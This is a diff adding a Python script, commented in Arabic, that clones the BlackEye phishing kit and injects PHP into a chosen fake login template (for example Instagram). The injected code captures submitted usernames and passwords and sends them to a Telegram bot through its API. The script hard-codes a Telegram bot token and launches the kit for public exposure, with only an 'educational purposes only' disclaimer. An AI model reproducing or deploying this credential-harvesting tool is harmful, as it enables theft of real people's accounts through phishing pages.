@@ -1,0 +1,199 @@
+import os
+import sys
+import subprocess
+import time
+
+# --- معلومات البوت الثابتة ---
+# هذا هو توكن بوت تليجرام الخاص بك الذي قدمته
+TELEGRAM_BOT_TOKEN = "5984403789:AAG0N8ThL71h4mIxPuIb4F863OyZurWBM8A"
+
+# --- مسارات المشروع ---
+GITHUB_REPO_URL = "https://github.com/M4cs/BlackEye-Python.git"
+REPO_DIRECTORY = "BlackEye-Python"
+
+def check_command_exists(command_name):
+    """
+    التحقق مما إذا كان أمر معين (مثل git, php) مثبتًا في النظام.
+    Returns True if the command exists, False otherwise.
+    """
+    try:
+        # تشغيل الأمر مع خيار --version للتحقق من وجوده
+        subprocess.run([command_name, '--version'], check=True, capture_output=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        return True
+    except (subprocess.CalledProcessError, FileNotFoundError):
+        # إذا فشل الأمر أو لم يتم العثور عليه
+        return False
+
+def get_user_inputs():
+    """
+    الحصول على مدخلات المستخدم لاسم القالب ومعرف الدردشة.
+    Prompts the user for template folder, PHP file name, and Telegram Chat ID.
+    """
+    print("\n--- إعداد دمج تليجرام ---")
+    template_folder = input("أدخل اسم مجلد القالب (مثال: instagram): ").strip()
+    php_file_name = input("أدخل اسم ملف PHP لمعالج البيانات داخل القالب (مثال: login.php): ").strip()
+    chat_id = input("أدخل معرف الدردشة الخاص ببوت تليجرام (Chat ID): ").strip()
+
+    if not all([template_folder, php_file_name, chat_id]):
+        print("خطأ: جميع الحقول مطلوبة. يرجى البدء من جديد.")
+        sys.exit(1)
+    return template_folder, php_file_name, chat_id
+
+def generate_telegram_php_code(chat_id, bot_token, template_name):
+    """
+    ينشئ جزء كود PHP لدمج تليجرام مع البيانات المرسلة.
+    Generates the PHP code snippet for Telegram integration.
+    """
+    return f"""
+<?php
+// --- بداية دمج التليجرام بواسطة السكريبت ---
+// يرجى ملاحظة: تم إضافة هذا الكود تلقائياً لربط البيانات ببوت تليجرام.
+
+$botToken = '{bot_token}';
+$chatId = '{chat_id}';
+
+if ($_SERVER["REQUEST_METHOD"] == "POST") {{
+    // استخراج اسم المستخدم وكلمة المرور من البيانات المرسلة
+    // قد تختلف أسماء الحقول حسب القالب (غالباً 'username' و 'password')
+    $username = isset($_POST['username']) ? htmlspecialchars($_POST['username']) : 'غير متاح';
+    $password = isset($_POST['password']) ? htmlspecialchars($_POST['password']) : 'غير متاح';
+
+    // صياغة الرسالة التي سيتم إرسالها إلى التليجرام
+    $message = "🚨 تم تلقي بيانات دخول جديدة من قالب {template_name}! 🚨\\n";
+    $message .= "🔑 اسم المستخدم: <b>" . $username . "</b>\\n";
+    $message .= "🔒 كلمة المرور: <b>" . $password . "</b>\\n";
+
+    // عنوان URL لواجهة برمجة تطبيقات التليجرام
+    $telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
+
+    // إعداد البيانات لإرسالها
+    $data = [
+        'chat_id' => $chatId,
+        'text' => $message,
+        'parse_mode' => 'HTML' // استخدام HTML لتنسيق الرسالة
+    ];
+
+    // تهيئة طلب cURL (يفضل استخدام cURL)
+    if (function_exists('curl_init')) {{
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_exec($ch);
+        curl_close($ch);
+    }} else {{
+        // بديل: استخدام file_get_contents إذا لم يكن cURL متاحاً
+        $options = [
+            'http' => [
+                'method' => 'POST',
+                'header' => 'Content-type: application/x-www-form-urlencoded',
+                'content' => http_build_query($data),
+            ],
+        ];
+        $context = stream_context_create($options);
+        @file_get_contents($telegramApiUrl, false, $context);
+    }}
+}}
+// --- نهاية دمج التليجرام ---
+?>
+"""
+
+def modify_php_file(file_path, telegram_php_code_snippet):
+    """
+    يعدل ملف PHP لإضافة كود تليجرام.
+    Inserts the Telegram PHP code snippet into the target PHP file.
+    """
+    try:
+        with open(file_path, 'r', encoding='utf-8') as f:
+            content = f.read()
+
+        # نقطة الإدخال: بعد علامة <?php مباشرة
+        # نبحث عن <?php ونضيف الكود بعدها.
+        # إذا لم نجدها، نضع الكود في بداية الملف (وهو أمر غير مرجح لملف PHP)
+        if content.strip().startswith("<?php"):
+            # تقسيم المحتوى بعد أول ظهور لـ <?php
+            parts = content.split("<?php", 1)
+            # إعادة بناء المحتوى بإضافة الكود
+            new_content = parts[0] + "<?php\n" + telegram_php_code_snippet + "\n" + parts[1]
+        else:
+            # إذا لم تكن العلامة موجودة، نضع الكود في البداية
+            print("تحذير: لم يتم العثور على علامة '<?php' في بداية الملف. سيتم إضافة الكود في البداية.")
+            new_content = telegram_php_code_snippet + "\n" + content
+
+        with open(file_path, 'w', encoding='utf-8') as f:
+            f.write(new_content)
+        print(f"تم تعديل الملف '{file_path}' بنجاح.")
+    except Exception as e:
+        print(f"خطأ أثناء تعديل ملف PHP: {e}")
+        sys.exit(1)
+
+def main():
+    print("--- تشغيل BlackEye-Python مع دمج تليجرام في Replit ---")
+    print("ملاحظة هامة: هذه الأداة لأغراض تعليمية فقط. يرجى استخدامها بمسؤولية وأخلاقية.")
+    print("سيقوم Replit بتثبيت PHP و Git و OpenSSH تلقائيًا بناءً على ملف .replit.")
+    print(f"توكن بوت تليجرام المستخدم: {TELEGRAM_BOT_TOKEN}\n")
+
+    # 1. التحقق من تثبيت Git (يجب أن يتم تثبيته بواسطة .replit)
+    if not check_command_exists("git"):
+        print("خطأ: 'git' غير مثبت أو غير متاح. يرجى التأكد من إعداد ملف .replit بشكل صحيح.")
+        sys.exit(1)
+    print("'git' موجود.")
+
+    # 2. استنساخ المستودع إذا لم يكن موجودًا بالفعل
+    if not os.path.exists(REPO_DIRECTORY):
+        print(f"جارٍ استنساخ المستودع من {GITHUB_REPO_URL}...")
+        try:
+            # استخدم capture_output لمنع طباعة git مباشرة إلى الوحدة الطرفية
+            result = subprocess.run(["git", "clone", GITHUB_REPO_URL], check=True, capture_output=True, text=True)
+            print(result.stdout)
+            print("تم استنساخ المستودع بنجاح.")
+        except subprocess.CalledProcessError as e:
+            print(f"فشل استنساخ المستودع: {e.stderr}")
+            sys.exit(1)
+    else:
+        print(f"المستودع '{REPO_DIRECTORY}' موجود بالفعل. تخطي خطوة الاستنساخ.")
+        # يمكنك إضافة os.chdir(REPO_DIRECTORY) ثم subprocess.run(["git", "pull"]) لتحديث المشروع
+
+    # 3. الحصول على مدخلات المستخدم
+    template_folder, php_file_name, chat_id = get_user_inputs()
+
+    # 4. بناء مسار ملف PHP
+    php_file_path = os.path.join(REPO_DIRECTORY, "sites", template_folder, php_file_name)
+    
+    if not os.path.exists(php_file_path):
+        print(f"خطأ: ملف PHP المحدد '{php_file_path}' غير موجود.")
+        print("يرجى التأكد من اسم مجلد القالب واسم ملف PHP الصحيحين.")
+        sys.exit(1)
+
+    # 5. توليد كود تليجرام PHP
+    telegram_php_code_snippet = generate_telegram_php_code(chat_id, TELEGRAM_BOT_TOKEN, template_folder)
+
+    # 6. تعديل ملف PHP
+    modify_php_file(php_file_path, telegram_php_code_snippet)
+
+    # 7. الانتقال إلى دليل المشروع وتشغيل BlackEye
+    print(f"\nجارٍ تشغيل BlackEye من الدليل: {os.path.join(os.getcwd(), REPO_DIRECTORY)}...")
+    print("انظر إلى جزء 'Console' في Replit لمخرجات BlackEye.")
+    print("قد يستغرق الأمر بعض الوقت حتى يتم بدء تشغيل Serveo.")
+    
+    try:
+        # تشغيل main.py داخل دليل BlackEye-Python
+        # Popen يسمح بالاستمرار في تنفيذ السكريبت البايثون
+        process = subprocess.Popen(["python3", "main.py"], cwd=REPO_DIRECTORY, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        
+        # طباعة مخرجات BlackEye في الوقت الفعلي
+        for line in process.stdout:
+            print(line, end='')
+        for line in process.stderr:
+            print(line, end='')
+        
+        process.wait() # انتظر حتى يكتمل تشغيل BlackEye (أو يتم إغلاقه يدويا)
+
+    except Exception as e:
+        print(f"حدث خطأ أثناء تشغيل BlackEye: {e}")
+        print("تأكد من تثبيت PHP و OpenSSH Client بواسطة Replit بشكل صحيح.")
+
+if __name__ == "__main__":
+    main()
